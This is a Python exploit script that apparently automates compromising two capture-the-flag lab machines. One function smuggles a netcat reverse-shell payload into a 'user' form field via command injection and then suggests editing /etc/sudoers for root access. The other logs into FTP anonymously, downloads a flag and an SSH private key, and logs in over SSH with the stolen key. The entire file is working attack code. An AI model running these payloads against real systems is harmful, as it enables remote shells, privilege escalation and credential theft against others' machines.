import requests
import os
import ftplib

machineName = input("Enter Machine Name: ")
sess = requests.session()

# -------------------------------------------------- Tyler -------------------------------------------------- #
def Tyler():
    global sess
    ip = input("Enter Machine Ip: ")
    response = os.system(f"ping -c 1 {ip} > /dev/null")
    if response == 0:
        print('[*] Host is up')
    else:
        print('[!] Host is down, Check Your Ip Or Vpn')
        exit()
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

    postData = {
        "user" : f'1;{payload}',
        "submit" : 'Submit+Query'
    }
    print("[*] Sending Payload")
    try:
        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
        if(shell.status_code == 200):
            print("[*] Payload Sent")
            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
            print("[*] Then do whatever you want")
        else:
            print("[!] Payload Failed")
            exit()
    except:
        print("[!] Connection Failed")

def production():
    ip = input("Enter Machine Ip: ")
    username = "anonymous"
    password = "anonymous"
    filenames = [
            "flag.txt",
            "id_rsa"
    ]
    ftp_server = ftplib.FTP(ip, username, password)
    ftp_server.encoding = 'utf-8'
    for filenames in filenames:
        with open(filenames, "wb") as f:
            ftp_server.retrbinary(f"RETR {filenames}", f.write)
        file = open("flag.txt", "r")
    print("first flag: " + file.read())
    os.system("rm -r 'flag.txt'; chmod 600 id_rsa")
    os.system("ssh -i id_rsa -p 22 ashu@" + ip)
    ftp_server.quit()


if __name__ == "__main__":
    if machineName == "Tyler" or machineName == "tyler":
        Tyler()
    if machineName == "Production" or machineName == "production":
        production()
